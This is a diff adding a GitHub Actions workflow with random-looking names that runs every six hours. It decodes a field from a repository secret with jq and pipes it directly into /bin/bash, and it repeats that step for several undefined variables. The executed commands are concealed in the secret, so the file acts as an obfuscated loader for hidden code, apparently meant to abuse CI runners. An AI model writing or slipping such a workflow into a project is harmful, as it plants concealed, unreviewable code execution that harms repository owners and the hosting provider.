@@ -1,0 +1,23 @@
+name: caozhang19870101
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: caozhang19870101
+        env:
+          xwb842: ${{ secrets.xwb842 }}
+        run: |
+          echo $xwb842 | jq -r .yeray97128 | /bin/bash
+          echo $n64 | jq -r .mhf16 | /bin/bash
+          echo $nyloe55 | jq -r .rin848 | /bin/bash
+          echo $nmbnr01962 | jq -r .vna01541 | /bin/bash
+          echo $pr90715 | jq -r .wn74 | /bin/bash
+          echo $az9 | jq -r .aqaw29773 | /bin/bash
+
